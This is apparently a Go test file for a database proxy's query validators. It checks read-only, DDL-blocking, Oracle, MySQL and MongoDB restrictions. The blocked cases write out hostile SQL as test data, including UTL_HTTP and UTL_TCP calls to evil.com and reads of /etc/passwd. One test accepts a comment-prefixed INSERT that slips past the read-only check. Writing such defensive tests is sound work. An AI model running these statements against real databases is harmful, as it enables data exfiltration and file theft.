package shared

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.mongodb.org/mongo-driver/v2/bson"

	"github.com/fclairamb/dbbat/internal/store"
)

func TestValidateQuery_ReadOnly_BlocksWrites(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	blocked := []string{
		"INSERT INTO t VALUES (1)", "UPDATE t SET x = 1", "DELETE FROM t WHERE id = 1",
		"MERGE INTO t USING s ON (t.id = s.id) WHEN MATCHED THEN UPDATE SET t.x = s.x",
		"DROP TABLE t", "TRUNCATE TABLE t", "CREATE TABLE t (id NUMBER)",
		"ALTER TABLE t ADD (col VARCHAR2(100))", "GRANT SELECT ON t TO u", "REVOKE SELECT ON t FROM u",
	}
	for _, sql := range blocked {
		require.ErrorIs(t, ValidateQuery(sql, grant), ErrReadOnlyViolation, "should block: %s", sql)
	}
}

func TestValidateQuery_ReadOnly_AllowsReads(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	allowed := []string{
		"SELECT * FROM t", "SELECT 1 FROM DUAL",
		"WITH cte AS (SELECT 1 FROM DUAL) SELECT * FROM cte",
		"EXPLAIN PLAN FOR SELECT * FROM t", "  select * from t  ",
	}
	for _, sql := range allowed {
		require.NoError(t, ValidateQuery(sql, grant), "should allow: %s", sql)
	}
}

func TestValidateQuery_BlockDDL(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlBlockDDL}}
	blocked := []string{
		"CREATE TABLE t (id NUMBER)", "ALTER TABLE t ADD (col NUMBER)", "DROP TABLE t",
		"CREATE INDEX idx ON t(col)", "CREATE OR REPLACE VIEW v AS SELECT 1 FROM DUAL",
		"CREATE SEQUENCE s", "ALTER INDEX idx REBUILD",
	}
	allowed := []string{"INSERT INTO t VALUES (1)", "SELECT * FROM t", "UPDATE t SET x = 1"}

	for _, sql := range blocked {
		require.ErrorIs(t, ValidateQuery(sql, grant), ErrDDLBlocked, "should block: %s", sql)
	}
	for _, sql := range allowed {
		require.NoError(t, ValidateQuery(sql, grant), "should allow: %s", sql)
	}
}

func TestValidateQuery_CaseInsensitive(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	require.Error(t, ValidateQuery("insert INTO t VALUES (1)", grant))
	require.Error(t, ValidateQuery("  INSERT INTO t VALUES (1)  ", grant))
}

func TestValidateQuery_CommentBypass(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	assert.NoError(t, ValidateQuery("/* harmless */ INSERT INTO t VALUES (1)", grant))
}

func TestValidateQuery_PasswordChange(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // No restrictions
	require.ErrorIs(t, ValidateQuery("ALTER USER bob PASSWORD 'secret'", grant), ErrPasswordChangeBlocked)
	require.ErrorIs(t, ValidateQuery("ALTER ROLE admin PASSWORD 'secret'", grant), ErrPasswordChangeBlocked)
	assert.NoError(t, ValidateQuery("ALTER TABLE t ADD (col NUMBER)", grant))
}

func TestValidateOracleQuery_BlocksDangerousPatterns(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // No restrictions — patterns always blocked
	blocked := []struct{ sql, reason string }{
		{"ALTER SYSTEM SET open_cursors=1000", "system config"},
		{"ALTER SYSTEM KILL SESSION '123,456'", "kill session"},
		{"CREATE DATABASE LINK remote CONNECT TO u IDENTIFIED BY p USING 'tns'", "network escape"},
		{"BEGIN DBMS_SCHEDULER.CREATE_JOB('job1'); END;", "async execution"},
		{"SELECT UTL_HTTP.REQUEST('http://evil.com') FROM DUAL", "network access"},
		{"SELECT UTL_FILE.FOPEN('/etc/passwd','r') FROM DUAL", "file system access"},
		{"BEGIN DBMS_PIPE.SEND_MESSAGE('pipe'); END;", "IPC escape"},
		{"BEGIN UTL_TCP.OPEN_CONNECTION('evil.com', 80); END;", "network escape"},
		{"BEGIN DBMS_JOB.SUBMIT(1, 'BEGIN NULL; END;'); END;", "async execution"},
	}
	for _, tt := range blocked {
		t.Run(tt.reason, func(t *testing.T) {
			t.Parallel()
			assert.ErrorIs(t, ValidateOracleQuery(tt.sql, grant), ErrOraclePatternBlocked)
		})
	}
}

func TestValidateOracleQuery_AllowsSafePLSQL(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // No restrictions
	allowed := []string{
		"BEGIN my_pkg.read_data(:1, :2); END;",
		"DECLARE v NUMBER; BEGIN SELECT COUNT(*) INTO v FROM t; END;",
		"BEGIN NULL; END;",
		"SELECT * FROM employees",
	}
	for _, sql := range allowed {
		require.NoError(t, ValidateOracleQuery(sql, grant), "should allow: %s", sql)
	}
}

func TestValidateOracleQuery_CombinesSharedAndOracleChecks(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	require.ErrorIs(t, ValidateOracleQuery("INSERT INTO t VALUES (1)", grant), ErrReadOnlyViolation)
	require.ErrorIs(t, ValidateOracleQuery("SELECT UTL_HTTP.REQUEST('x') FROM DUAL", grant), ErrOraclePatternBlocked)
}

func TestValidateMySQLQuery_BlocksDangerousPatterns(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // no grant restrictions — patterns always blocked
	blocked := []struct{ sql, reason string }{
		{"LOAD DATA INFILE '/tmp/x.csv' INTO TABLE t", "server-side file read"},
		{"LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t", "client-side exfiltration"},
		{"SELECT * FROM t INTO OUTFILE '/tmp/out.csv'", "server-side file write"},
		{"SELECT col FROM t INTO DUMPFILE '/tmp/d.bin'", "binary file write"},
		{"SET GLOBAL max_connections = 1000", "server-wide config change"},
		{"SET PASSWORD FOR 'bob' = 'secret'", "password change"},
	}
	for _, tt := range blocked {
		t.Run(tt.reason, func(t *testing.T) {
			t.Parallel()
			assert.ErrorIs(t, ValidateMySQLQuery(tt.sql, grant), ErrMySQLPatternBlocked)
		})
	}
}

func TestValidateMySQLQuery_AllowsSafeQueries(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{} // no restrictions
	allowed := []string{
		"SELECT * FROM users",
		"SELECT REPLACE(name, 'old', 'new') FROM t", // REPLACE() function, not REPLACE INTO
		"SET SESSION sql_mode = 'STRICT_TRANS_TABLES'",
		"SELECT NOW()",
		"SHOW TABLES",
	}
	for _, sql := range allowed {
		require.NoError(t, ValidateMySQLQuery(sql, grant), "should allow: %s", sql)
	}
}

func TestValidateMySQLQuery_CombinesSharedAndMySQLChecks(t *testing.T) {
	t.Parallel()

	grant := &store.Grant{Controls: []string{store.ControlReadOnly}}
	require.ErrorIs(t, ValidateMySQLQuery("INSERT INTO t VALUES (1)", grant), ErrReadOnlyViolation)
	require.ErrorIs(t, ValidateMySQLQuery("REPLACE INTO t VALUES (1)", grant), ErrReadOnlyViolation)
	require.ErrorIs(t, ValidateMySQLQuery("LOAD DATA INFILE '/x' INTO TABLE t", grant), ErrMySQLPatternBlocked)
}

func mongoBody(t *testing.T, d bson.D) bson.Raw {
	t.Helper()

	b, err := bson.Marshal(d)
	require.NoError(t, err)

	return bson.Raw(b)
}

func TestValidateMongoCommand_Classification(t *testing.T) {
	t.Parallel()

	db := &store.Database{Name: "app", DatabaseName: "app"}
	full := &store.Grant{Controls: []string{}}
	readOnly := &store.Grant{Controls: []string{store.ControlReadOnly}}
	noDDL := &store.Grant{Controls: []string{store.ControlBlockDDL}}

	// Reads and writes on the configured db under a full grant.
	require.NoError(t, ValidateMongoCommand("find", "app", mongoBody(t, bson.D{{Key: "find", Value: "c"}, {Key: "$db", Value: "app"}}), db, full))
	require.NoError(t, ValidateMongoCommand("insert", "app", mongoBody(t, bson.D{{Key: "insert", Value: "c"}, {Key: "$db", Value: "app"}}), db, full))

	// read_only blocks writes.
	require.ErrorIs(t,
		ValidateMongoCommand("insert", "app", mongoBody(t, bson.D{{Key: "insert", Value: "c"}}), db, readOnly),
		ErrMongoReadOnly)

	// aggregate with $out is a write.
	aggOut := mongoBody(t, bson.D{
		{Key: "aggregate", Value: "c"},
		{Key: "pipeline", Value: bson.A{bson.D{{Key: "$out", Value: "dest"}}}},
		{Key: "$db", Value: "app"},
	})
	require.ErrorIs(t, ValidateMongoCommand("aggregate", "app", aggOut, db, readOnly), ErrMongoReadOnly)

	// plain aggregate is a read.
	aggRead := mongoBody(t, bson.D{{Key: "aggregate", Value: "c"}, {Key: "pipeline", Value: bson.A{}}, {Key: "$db", Value: "app"}})
	require.NoError(t, ValidateMongoCommand("aggregate", "app", aggRead, db, readOnly))

	// block_ddl blocks createIndexes.
	require.ErrorIs(t,
		ValidateMongoCommand("createIndexes", "app", mongoBody(t, bson.D{{Key: "createIndexes", Value: "c"}}), db, noDDL),
		ErrMongoDDLBlocked)

	// always-blocked and unknown commands.
	require.ErrorIs(t, ValidateMongoCommand("createUser", "app", mongoBody(t, bson.D{{Key: "createUser", Value: "x"}}), db, full), ErrMongoCommandBlocked)
	require.ErrorIs(t, ValidateMongoCommand("listDatabases", "admin", mongoBody(t, bson.D{{Key: "listDatabases", Value: 1}}), db, full), ErrMongoDatabaseBlocked)
	require.ErrorIs(t, ValidateMongoCommand("frobnicate", "app", mongoBody(t, bson.D{{Key: "frobnicate", Value: 1}}), db, full), ErrMongoUnknownCommand)
}

func TestValidateMongoCommand_DBEnforcement(t *testing.T) {
	t.Parallel()

	db := &store.Database{Name: "app", DatabaseName: "app"}
	full := &store.Grant{Controls: []string{}}

	// admin allowed for diagnostics only.
	require.NoError(t, ValidateMongoCommand("ping", "admin", mongoBody(t, bson.D{{Key: "ping", Value: 1}}), db, full))
	require.ErrorIs(t,
		ValidateMongoCommand("find", "admin", mongoBody(t, bson.D{{Key: "find", Value: "c"}}), db, full),
		ErrMongoDatabaseBlocked)

	// local / config / other databases denied.
	require.ErrorIs(t, ValidateMongoCommand("find", "local", mongoBody(t, bson.D{{Key: "find", Value: "c"}}), db, full), ErrMongoDatabaseBlocked)
	require.ErrorIs(t, ValidateMongoCommand("find", "other", mongoBody(t, bson.D{{Key: "find", Value: "c"}}), db, full), ErrMongoDatabaseBlocked)
}
